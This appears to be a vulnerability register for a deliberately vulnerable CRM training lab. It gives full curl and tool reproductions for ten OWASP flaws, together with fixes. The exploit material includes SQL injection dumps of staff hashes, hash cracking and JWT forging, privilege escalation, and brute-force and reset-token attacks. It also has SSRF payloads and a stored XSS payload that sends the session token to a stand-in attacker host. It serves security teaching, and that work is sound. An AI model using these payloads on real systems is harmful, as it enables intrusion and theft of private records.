# VULNERABILITIES.md — Vulnerability Register

Target: **Alliance CRM** (intentionally vulnerable training app).
Base URL in examples: `http://TARGET:4000` — replace `TARGET` with your lab IP
(e.g. the host-only adapter address). Tester starts from Kali with Burp Suite,
OWASP ZAP, Nikto, `curl`, `sqlmap`, `jwt_tool`, `hashcat`/`john`, `hydra`.

Find every planted bug in source:
```bash
grep -rn "VULN A0" .
```

---

## Register (one row per vulnerability)

| ID  | OWASP (2021)                     | Where (endpoint / file)                          | Best tool to find | Likelihood | Severity |
|-----|----------------------------------|--------------------------------------------------|-------------------|-----------|----------|
| V1  | A03 Injection (SQLi)             | `GET /api/clients/search?q=` · `src/routes/clients.js` | sqlmap / Burp / manual | High | **Critical** |
| V2  | A01 Broken Access Control (priv-esc) | `PATCH /api/users/:id` · `src/routes/users.js`  | Burp / manual     | High | **Critical** |
| V3  | A01 Broken Access Control (IDOR) | `GET/PUT /api/clients/:id`, `/:id/notes` · `src/routes/clients.js` | Burp / ZAP | High | High |
| V4  | A02 Cryptographic Failures       | `db/init.sql`, `src/auth.js`, `.env`             | manual / review   | Medium | High |
| V5  | A03 Injection (Stored XSS)       | case notes · `src/routes/clients.js` + `public/client.html` | Burp / ZAP / manual | Medium | High |
| V6  | A04 Insecure Design              | `POST /api/intake`, `GET /api/export/clients`    | manual / ZAP      | High | Medium |
| V7  | A05 Security Misconfiguration    | `server.js`, `/backup`, `/.git`, `/.env`, `/debug`, `/api/docs` | **Nikto / ZAP** | High | High |
| V8  | A07 Auth / Identification Failures | `POST /api/auth/*` · `src/routes/auth.js`, `src/auth.js` | Burp Intruder / hydra | High | High |
| V9  | A09 Logging & Monitoring Failures | whole app (`audit_log` table never written)      | review / manual   | High | Medium |
| V10 | A10 SSRF                         | `POST /api/import/url` · `src/routes/import.js`   | Burp / manual     | Medium | High |

Plain-language impact and full reproduction for each are below.

---

## V1 — SQL Injection in client search (A03) — **Critical**

**Endpoint:** `GET /api/clients/search?q=<input>` (`src/routes/clients.js`, tagged
`// VULN A03`). The `q` value is concatenated straight into SQL:
```
SELECT id, full_name, email, phone, service_needs
FROM clients WHERE full_name ILIKE '%<q>%' OR email ILIKE '%<q>%'
```
5 columns are selected, so a `UNION SELECT` with 5 columns lines up.

**Plain-language impact (for the board):** The one search box on the staff portal
can be tricked into handing over the *entire* database — every veteran's private
file **and** every staff member's login — in a single request. One weak search
box leaks everything the organisation holds.

**Best tool:** `sqlmap` (automated), or Burp Repeater / browser (manual).

### Full exploit — dump the staff table (usernames, roles, password hashes)
You must be logged in (any role) because the route requires a token. Log in first
and grab the token:
```bash
TOKEN=$(curl -s -X POST http://TARGET:4000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"volunteer","password":"volunteer"}' | jq -r .token)
```

1. Baseline request (confirm the endpoint):
   ```bash
   curl -s "http://TARGET:4000/api/clients/search?q=a" -H "Authorization: Bearer $TOKEN" | jq
   ```
2. Inject a UNION payload that reads the `staff` table. Payload (before encoding):
   ```
   ' UNION SELECT id, username, password_hash, role, '' FROM staff -- 
   ```
3. Send it (URL-encoded):
   ```bash
   curl -s "http://TARGET:4000/api/clients/search?q=%27%20UNION%20SELECT%20id%2C%20username%2C%20password_hash%2C%20role%2C%20%27%27%20FROM%20staff%20--%20" \
     -H "Authorization: Bearer $TOKEN" | jq '.rows'
   ```
4. The response rows now contain, in the `full_name`/`email` positions, each
   staff **username** and **MD5 password hash** plus their **role**. Example:
   `{"id":1,"full_name":"director","email":"0192023a7bbd73250516f069df18b500","phone":"admin",...}`
5. Crack the hashes offline (they are unsalted MD5):
   ```bash
   echo '0192023a7bbd73250516f069df18b500' > hashes.txt
   hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
   # -> admin123   (full admin login)
   ```

### Full exploit — dump client PII the UI would hide (notes)
```
' UNION SELECT id, full_name, notes, phone, service_needs FROM clients -- 
```
```bash
curl -s "http://TARGET:4000/api/clients/search?q=%27%20UNION%20SELECT%20id%2C%20full_name%2C%20notes%2C%20phone%2C%20service_needs%20FROM%20clients%20--%20" \
  -H "Authorization: Bearer $TOKEN" | jq '.rows'
```
And the sensitive case notes:
```
' UNION SELECT client_id, body, '', '', '' FROM case_notes -- 
```

### Automated (sqlmap)
```bash
sqlmap -u "http://TARGET:4000/api/clients/search?q=a" \
  --headers="Authorization: Bearer $TOKEN" \
  -p q --dbms=postgresql --technique=U --dump -T staff
```

**Evidence to screenshot:** the response row containing a username + MD5 hash +
role; the hashcat line showing `admin123` cracked.

**Fix:** use parameterized queries (`db.query('... WHERE full_name ILIKE $1', ['%'+q+'%'])`).
Never concatenate user input into SQL. Add least-privilege DB roles.

---

## V2 — Privilege Escalation, staff → admin (A01) — **Critical**

**Endpoint:** `PATCH /api/users/:id` (`src/routes/users.js`, `// VULN A01`). It is
a "profile update" that writes any field in the body — including `role` — with no
check that the caller is an admin and no check that they are editing themselves.
This is **mass assignment**.

**Plain-language impact (for the board):** Any staff account — even a part-time
intake worker — can quietly promote itself to full administrator, then create or
delete other staff and see everything. One logic bug hands over the whole system.

**Best tool:** Burp Suite (Repeater), or `curl`.

### Full exploit (end-to-end)
1. Log in as a **low-privilege** user (Intake Coordinator) and capture the token
   and your user id:
   ```bash
   RESP=$(curl -s -X POST http://TARGET:4000/api/auth/login \
     -H 'Content-Type: application/json' \
     -d '{"username":"intake","password":"Welcome1"}')
   TOKEN=$(echo "$RESP" | jq -r .token)
   UID=$(echo "$RESP" | jq -r .user.id)     # intake = 3
   echo "token=$TOKEN uid=$UID"
   ```
2. Confirm you are **blocked** from an admin action first (proves the boundary is
   real). Try to create staff — expect `403 forbidden`:
   ```bash
   curl -s -X POST http://TARGET:4000/api/users -H "Authorization: Bearer $TOKEN" \
     -H 'Content-Type: application/json' \
     -d '{"username":"x","role":"volunteer","password":"x"}' ; echo
   ```
3. **Escalate**: PATCH your own record and set `role` to `admin`:
   ```bash
   curl -s -X PATCH http://TARGET:4000/api/users/$UID \
     -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
     -d '{"role":"admin"}' | jq
   # -> {"id":3,"username":"intake","role":"admin"}
   ```
4. Re-login so your **new token** carries `role=admin` (the server reads the role
   from the DB at login):
   ```bash
   TOKEN=$(curl -s -X POST http://TARGET:4000/api/auth/login \
     -H 'Content-Type: application/json' \
     -d '{"username":"intake","password":"Welcome1"}' | jq -r .token)
   ```
5. Confirm admin access — the staff-create that failed in step 2 now **succeeds**:
   ```bash
   curl -s -X POST http://TARGET:4000/api/users -H "Authorization: Bearer $TOKEN" \
     -H 'Content-Type: application/json' \
     -d '{"username":"attacker","full_name":"pwn","role":"admin","password":"pwn123"}' | jq
   ```
   In a browser, log in as `intake` after step 3, then open
   `http://TARGET:4000/staff.html` — the staff-management actions now work.

### Alternative escalation path — forge the JWT (A01 + A02)
Because the signing secret is weak (`alliance`, leaked in `.env` and `/debug`) and
the role claim is trusted as-is, you can forge an admin token without touching the
DB:
```bash
# with jwt_tool
jwt_tool $TOKEN -T    # tamper: set role -> admin
jwt_tool $TOKEN -S hs256 -p 'alliance'   # re-sign with the guessed secret
```
Use the forged token as `Authorization: Bearer ...`; admin endpoints accept it.

**Evidence to screenshot:** step 2 returning `403`, then step 5 returning `201
Created` with the same account; or the staff-management page working after login.

**Fix:** server-side, (1) only allow admins to call `PATCH /api/users/:id`,
(2) allow users to edit only their own id, (3) **allow-list** updatable fields and
exclude `role`, (4) don't trust the JWT role for authZ without re-checking, and
use a strong, secret signing key with token expiry.

---

## V3 — IDOR: any staff can read/edit any client + case notes (A01) — **High**

**Endpoints:** `GET /api/clients/:id`, `PUT /api/clients/:id`,
`GET/POST /api/clients/:id/notes` (`src/routes/clients.js`, `// VULN A01`). None
check whether the client is assigned to the caller or whether the caller's role
permits it. The list view hides other clients, but the per-id endpoints don't.

**Plain-language impact (for the board):** A peer-support worker or volunteer can
open any veteran's private file — including counselling notes — just by changing a
number in the web address, even for people they were never assigned to help.

**Best tool:** Burp Suite / OWASP ZAP (change the id and replay).

### Reproduction
1. Log in as the Peer Support Worker (sees only their own clients in the UI):
   ```bash
   TOKEN=$(curl -s -X POST http://TARGET:4000/api/auth/login \
     -H 'Content-Type: application/json' \
     -d '{"username":"peer","password":"Welcome1"}' | jq -r .token)
   ```
2. List your own clients to see which ids are "yours":
   ```bash
   curl -s http://TARGET:4000/api/clients -H "Authorization: Bearer $TOKEN" | jq '.rows[].id'
   ```
3. Request a client id that is **not** yours (e.g. 1) directly — it returns the
   full record anyway (IDOR):
   ```bash
   curl -s http://TARGET:4000/api/clients/1 -H "Authorization: Bearer $TOKEN" | jq
   ```
4. Read another client's private case notes, and even add/edit:
   ```bash
   curl -s http://TARGET:4000/api/clients/12/notes -H "Authorization: Bearer $TOKEN" | jq
   curl -s -X PUT http://TARGET:4000/api/clients/1 -H "Authorization: Bearer $TOKEN" \
     -H 'Content-Type: application/json' -d '{"notes":"edited by someone who should not"}' | jq
   ```
   (Same works as `volunteer`, who is supposed to be read-only / limited fields.)

**Evidence to screenshot:** the client list showing only a few assigned ids, then
a full record for an id not in that list.

**Fix:** enforce ownership/role on every per-record endpoint, e.g.
`WHERE id=$1 AND assigned_staff_id=$2` for peer_support, and deny writes for
read-only roles.

---

## V4 — Cryptographic Failures (A02) — **High**

**Where:** `db/init.sql` (passwords via `md5()`), `src/auth.js` (MD5 + weak JWT
secret), `.env` (secrets committed), no HTTPS. All tagged `// VULN A02`.

**Plain-language impact (for the board):** Passwords are stored with an
obsolete method that cracks in seconds, the "master key" for logins is a
dictionary word committed into the code, and traffic isn't encrypted. A stolen
backup or laptop instantly yields working staff passwords.

**Best tool:** source review; `hashcat`/`john` to demonstrate cracking.

### Reproduction
1. Obtain hashes (from the SQLi in V1, or the exposed backup in V7:
   `curl http://TARGET:4000/backup/alliance_crm_dump.sql`).
2. Crack — unsalted MD5, trivial:
   ```bash
   hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
   ```
   `0192023a7bbd73250516f069df18b500` → `admin123`.
3. Recover the JWT secret directly: `curl http://TARGET:4000/.env` or
   `curl http://TARGET:4000/debug` → `JWT_SECRET=alliance`. Forge any token (see V2).

**Evidence to screenshot:** hashcat cracking `admin123`; `.env`/`debug` showing the
JWT secret.

**Fix:** hash passwords with bcrypt/argon2 (salted); load a strong random
`JWT_SECRET` from a secret store (never commit `.env`); serve over HTTPS; add token
expiry.

---

## V5 — Stored XSS in case notes (A03) — **High**

**Where:** note body stored raw in `POST /api/clients/:id/notes`, then rendered
with `innerHTML` in `public/client.html` (both tagged `// VULN A03`).

> Note: because the sink is `innerHTML`, a plain `<script>` tag will **not**
> auto-run. Use an event-handler payload such as `<img src=x onerror=...>` or
> `<svg onload=...>`.

**Plain-language impact (for the board):** A malicious note saved on a client's
file runs hostile code in the browser of the next staff member who opens that
file — potentially stealing their logged-in session and whatever they can access.

**Best tool:** Burp / ZAP / manual browser.

### Reproduction
1. Log in (any role that can post notes, e.g. `peer`) and plant a payload on a
   client record:
   ```bash
   TOKEN=$(curl -s -X POST http://TARGET:4000/api/auth/login -H 'Content-Type: application/json' \
     -d '{"username":"peer","password":"Welcome1"}' | jq -r .token)
   curl -s -X POST http://TARGET:4000/api/clients/4/notes -H "Authorization: Bearer $TOKEN" \
     -H 'Content-Type: application/json' \
     -d '{"body":"<img src=x onerror=\"alert(document.cookie)\">"}' | jq
   ```
2. In a browser, log in as **any** staff user and open
   `http://TARGET:4000/client.html?id=4`.
3. The payload fires (an `alert` of the session token/cookie). A real attacker
   would exfiltrate instead:
   `<img src=x onerror="fetch('http://ATTACKER:8000/?c='+localStorage.getItem('token'))">`
   (the token is readable because it's in `localStorage` and in a non-HttpOnly
   cookie — see V7).

**Evidence to screenshot:** the `alert` popping on page load showing the token, or
the attacker listener receiving the token.

**Fix:** output-encode on render (use `textContent`, not `innerHTML`), sanitize
on input, and add a Content-Security-Policy. Set `HttpOnly` on the auth cookie so
scripts can't read it.

---

## V6 — Insecure Design: no intake limit, unlimited export (A04) — **Medium**

**Where:** `POST /api/intake` (no rate limit/CAPTCHA/size cap) and
`GET /api/export/clients` (no row cap, loose auth) — both `// VULN A04`.

**Plain-language impact (for the board):** The public form can be flooded with
junk submissions, burying real requests and filling the database; and any
logged-in account can download the **entire** client list — including private
notes — in one click, making bulk theft easy.

**Best tool:** manual / a simple loop; ZAP for the unauthenticated form.

### Reproduction
1. Flood the public intake form (no auth, no limit):
   ```bash
   for i in $(seq 1 500); do
     curl -s -X POST http://TARGET:4000/api/intake -H 'Content-Type: application/json' \
       -d "{\"name\":\"spam $i\",\"notes\":\"flood\"}" >/dev/null
   done
   ```
   All 500 succeed; no throttling. Verify the count grew.
2. Bulk export everything with a minimal account:
   ```bash
   TOKEN=$(curl -s -X POST http://TARGET:4000/api/auth/login -H 'Content-Type: application/json' \
     -d '{"username":"volunteer","password":"volunteer"}' | jq -r .token)
   curl -s http://TARGET:4000/api/export/clients -H "Authorization: Bearer $TOKEN" | jq '.clients | length'
   ```
   Returns all clients + all case notes, no cap, for a read-only role.

**Evidence to screenshot:** the client count jumping after the flood; the export
JSON length equal to the whole table from a volunteer account.

**Fix:** rate-limit + CAPTCHA on intake, cap/paginate exports, restrict export to
authorized roles, and log/alert on bulk access.

---

## V7 — Security Misconfiguration (A05) — **High** (easy scanner wins)

**Where:** `server.js` and served files. All tagged `// VULN A05` (plus A02).

**Plain-language impact (for the board):** The rushed setup left the "back door"
open: a database backup, the source code, and the secret keys are all downloadable
by anyone who visits the right web address, and the site is missing standard
browser protections. An attacker needs no skill — just a scanner.

**Best tool:** **Nikto** and **OWASP ZAP** find all of this automatically:
```bash
nikto -h http://TARGET:4000
# ZAP: run an automated scan / spider against http://TARGET:4000
```

### Checklist (each independently reproducible)
| Item | Check |
|---|---|
| Exposed DB backup + directory listing | `curl http://TARGET:4000/backup/` (lists files) and `curl http://TARGET:4000/backup/alliance_crm_dump.sql` (hashes + PII) |
| Exposed `.git` | `curl http://TARGET:4000/.git/` / `.../.git/config` (source & history leak) |
| Exposed `.env` secrets | `curl http://TARGET:4000/.env` |
| Debug endpoint leaks env + JWT secret | `curl http://TARGET:4000/debug` |
| Open API docs | `curl http://TARGET:4000/api/docs` |
| Version banners | `curl -I http://TARGET:4000/` → `Server: Express/4.19.2 ...`, `X-Powered-By: Express` |
| Missing security headers | no `Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security`, `X-Content-Type-Options` in responses |
| Permissive CORS | `curl -I -H 'Origin: http://evil.test' http://TARGET:4000/api/docs` → `Access-Control-Allow-Origin` reflects origin + `Allow-Credentials: true` |
| Cookie flags | after login, the `token` cookie is set **without** `HttpOnly`/`Secure`/`SameSite` (see `Set-Cookie` header) |
| Default admin password | `director` / `admin123` still works |

**Evidence to screenshot:** the Nikto report; the `/backup/` listing; the `.env`
response; the `Set-Cookie` header lacking `HttpOnly`.

**Fix:** remove `/backup`, `/.git`, `/.env`, `/debug` from the web root; disable
directory listing; add `helmet` (CSP, HSTS, X-Frame-Options, nosniff); restrict
CORS to known origins; set cookies `HttpOnly; Secure; SameSite=Strict`; strip
version banners; change default passwords.

---

## V8 — Authentication / Identification Failures (A07) — **High**

**Where:** `src/routes/auth.js`, `src/auth.js`. Tagged `// VULN A07`.

**Plain-language impact (for the board):** Logins can be guessed as fast as a
computer allows (no lockout), the login page tells an attacker which usernames are
real, the "forgot password" codes are predictable, sessions never expire, and
staff share one password. Account takeover is easy.

**Best tool:** Burp Intruder / `hydra` (brute force); manual for the rest.

### Reproductions
1. **No rate limiting / lockout** — brute force:
   ```bash
   hydra -l director -P /usr/share/wordlists/rockyou.txt TARGET -s 4000 \
     http-post-form "/api/auth/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:Incorrect password:H=Content-Type\: application/json"
   ```
   (Or Burp Intruder on the `password` field.) No account ever locks.
2. **User enumeration** — different responses reveal valid usernames:
   ```bash
   curl -s -o /dev/null -w "%{http_code}\n" -X POST http://TARGET:4000/api/auth/login \
     -H 'Content-Type: application/json' -d '{"username":"nope","password":"x"}'   # 404 "No account with that username"
   curl -s -o /dev/null -w "%{http_code}\n" -X POST http://TARGET:4000/api/auth/login \
     -H 'Content-Type: application/json' -d '{"username":"director","password":"x"}' # 401 "Incorrect password"
   ```
3. **Predictable reset token** — `md5(username + ":" + YYYY-MM-DD)`, and the API
   even echoes it:
   ```bash
   TODAY=$(date -u +%F)
   GUESS=$(printf '%s' "director:$TODAY" | md5sum | cut -d' ' -f1)
   curl -s -X POST http://TARGET:4000/api/auth/reset-request -H 'Content-Type: application/json' \
     -d '{"username":"director"}'    # returns reset_token; equals $GUESS
   curl -s -X POST http://TARGET:4000/api/auth/reset -H 'Content-Type: application/json' \
     -d "{\"username\":\"director\",\"token\":\"$GUESS\",\"new_password\":\"pwned123\"}"
   ```
   The token can be computed offline without ever calling reset-request.
4. **JWT never expires** — decode any login token; there is no `exp` claim, so a
   stolen token works forever.
5. **Shared/reused password** — `Welcome1` logs in `pmanager`, `intake`, **and**
   `peer`.

**Evidence to screenshot:** the two different login status codes/messages; the
guessed reset token matching the server's; a decoded token with no `exp`.

**Fix:** rate-limit + account lockout; identical generic login error for all
failures; cryptographically random, single-use, expiring reset tokens (never
returned in the response); JWT expiry + rotation; enforce unique strong passwords
and MFA.

---

## V9 — Logging & Monitoring Failures (A09) — **Medium**

**Where:** the whole app. An `audit_log` table exists (`db/init.sql`) but the app
**never writes to it** (`// VULN A09`). Logins, record views, edits, and exports
are not recorded.

**Plain-language impact (for the board):** If veteran files are stolen or snooped,
there is no record of who did it or when — the organisation can't tell funders or
clients what happened, and can't investigate. For a trust-dependent nonprofit,
that's a reporting and reputational disaster.

**Best tool:** review / manual (absence of evidence).

### Reproduction
1. Perform sensitive actions: log in, view many client records (V3), run the bulk
   export (V6).
2. Inspect the audit trail:
   ```bash
   docker exec -it alliance_crm_db psql -U alliance -d alliance_crm -c 'SELECT count(*) FROM audit_log;'
   ```
   Returns `0` — none of the above was recorded. Server stdout logs no access
   events either.

**Evidence to screenshot:** `audit_log` count `0` after performing exports/views.

**Fix:** record authentication, access to sensitive records, and exports to an
append-only audit log with user, action, target, timestamp, and source IP; ship
logs off-box; alert on bulk access.

---

## V10 — Server-Side Request Forgery (A10) — **High**

**Where:** `POST /api/import/url` (`src/routes/import.js`, `// VULN A10`). The
server fetches any URL supplied by the user and returns the response body. No
scheme/host allow-list.

**Plain-language impact (for the board):** A harmless-looking "import a logo or
document from a web link" feature can be pointed at the organisation's *internal*
systems, letting an attacker reach things that should never be visible from
outside — using the server as a proxy.

**Best tool:** Burp / manual.

### Reproduction
1. Log in (any role) and make the server fetch an internal URL. Point it back at
   the app's own debug endpoint to prove internal reach and leak the JWT secret:
   ```bash
   TOKEN=$(curl -s -X POST http://TARGET:4000/api/auth/login -H 'Content-Type: application/json' \
     -d '{"username":"volunteer","password":"volunteer"}' | jq -r .token)
   curl -s -X POST http://TARGET:4000/api/import/url -H "Authorization: Bearer $TOKEN" \
     -H 'Content-Type: application/json' -d '{"url":"http://127.0.0.1:4000/debug"}' | jq
   ```
   The response `body` field contains the internal page's content.
2. In a lab with other host-only VMs / services, point it at them, e.g.
   `{"url":"http://192.168.56.20:8080/admin"}` or a metadata-style address
   `{"url":"http://169.254.169.254/"}` — the server fetches and returns it.
3. It also reads local files via `file://` if the fetch client allows it; try
   `{"url":"file:///etc/passwd"}` and observe behaviour.

**Evidence to screenshot:** the `body` of an internal URL returned through the
import endpoint.

**Fix:** allow-list permitted schemes (`https` only) and destination hosts; block
private/link-local/loopback ranges; resolve-and-pin DNS; never return raw fetched
bodies to the caller.

---

## Suggested testing order
1. **Nikto/ZAP** sweep → V7 misconfigurations (free, fast, orients you).
2. Read `/backup/alliance_crm_dump.sql`, `/.env`, `/debug` → credentials + JWT
   secret (V4/V7).
3. Log in; **V1 SQLi** to dump staff hashes; crack `admin123` (V4).
4. **V2 privilege escalation** and **V3 IDOR** with Burp.
5. **V5 XSS**, **V8 auth**, **V6 design**, **V10 SSRF**, confirm **V9** gap.
